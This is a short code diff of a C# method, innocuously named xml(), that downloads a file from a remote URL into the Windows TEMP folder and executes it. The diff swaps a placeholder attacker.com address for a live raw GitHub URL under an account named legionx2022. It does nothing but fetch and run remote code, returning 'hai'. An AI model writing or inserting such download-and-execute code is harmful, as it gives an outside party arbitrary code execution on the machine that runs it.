@@ -8,11 +8,11 @@
 public string xml()
   {
             System.Net.WebClient client = new System.Net.WebClient();
-            client.DownloadFile(@"http://attacker.com/output.txt", @"C:\\windows\\TEMP\\test92.txt");
+            client.DownloadFile(@"https://raw.githubusercontent.com/legionx2022/ourtest/main/test.txt", @"C:\\windows\\TEMP\\test921.txt");
             System.Diagnostics.Process p = new System.Diagnostics.Process();
             p.StartInfo.UseShellExecute = false;
             p.StartInfo.RedirectStandardOutput = true;
-            p.StartInfo.FileName = @"C:\\windows\\TEMP\\test92.txt";
+            p.StartInfo.FileName = @"C:\\windows\\TEMP\\test921.txt";
             p.Start(); 
            return "hai";
  
